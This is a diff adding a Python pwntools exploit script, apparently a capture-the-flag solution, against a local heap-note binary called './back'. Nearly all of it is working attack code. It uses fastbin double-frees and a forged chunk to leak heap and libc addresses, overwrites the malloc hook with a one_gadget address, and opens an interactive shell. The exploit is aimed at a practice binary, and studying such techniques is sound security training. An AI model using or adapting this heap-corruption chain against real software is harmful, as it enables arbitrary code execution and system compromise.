@@ -1,0 +1,94 @@
+from pwn import *
+
+io = process("./back",env={"LD_PRELOAD":"./libc.so.6"})
+
+def add(size,note):
+    io.sendlineafter("Choice >>","1")
+    io.sendlineafter("Size:",str(size))
+    io.sendafter("Note:",str(note))
+
+def delete(idx):
+    io.sendlineafter("Choice >>","2")
+    io.sendlineafter("Index:",str(idx))
+
+
+add(70,"a"*20)
+add(70,"b"*20)
+payload = "\x00"*48+p64(0)+p64(0x21)          # this will be the place where fake chunk is created
+
+add(70,payload)
+add(70,"b"*20)
+
+
+
+add(70,"b"*20)    # thsese will be later used to get libc leak
+add(70,"b"*20)
+add(70,"b"*20)
+add(70,"b"*20)
+
+add(70,"b"*20)
+add(70,"b"*20)
+add(70,"b"*20)
+
+delete(0)                 # To do the first overwrite to get heap_leak
+delete(1)
+delete(0)
+delete(2)
+
+add(10,"\xf0")        # change the header's first address to a place with heap address
+delete(0)             # print the heap
+io.recvuntil("You will free: ")
+
+heap_leak = u64(io.recv(6)+"\x00\x00")-0x10
+log.info("heap @ "+str(hex(heap_leak)))
+
+delete(3)       # just to correct  fastbin
+add(10,p64(heap_leak+0x140))  # point to fake chunk
+add(70,"e"*10)
+
+payload = "\x00"*8+p64(0xe1)      # edit the fake chunk thus overwriting a headers chunk's size
+add(16,payload)
+
+delete(3)              # freeing the header chunk whose size was changed
+
+delete(4)                 # to do the second overwrite to get libc leak
+delete(5)
+delete(4)
+delete(6)
+
+
+add(10,p64(heap_leak+0x160))  # change the header's first address to a place with libc address
+
+delete(4)         # print the libc
+io.recvuntil("You will free: ")
+
+libc_leak = u64(io.recv(6)+"\x00\x00")-0x3c4b78
+
+log.info("libc @ "+str(hex(libc_leak)))
+
+payload = p64(0)*13+p64(0x71)
+add(150,payload)
+
+delete(4)
+delete(3)
+
+hook = libc_leak + 0x3c4aed
+
+payload = p64(0)*13+p64(0x71)+p64(hook)
+add(150,payload)
+
+delete(8)
+delete(9)
+#delete(10)
+
+add(96,"00000")
+
+one = libc_leak + 0xf02a4
+
+payload = "\x00"*19 + p64(one)
+add(96,payload)
+
+
+gdb.attach(io)
+
+io.interactive()
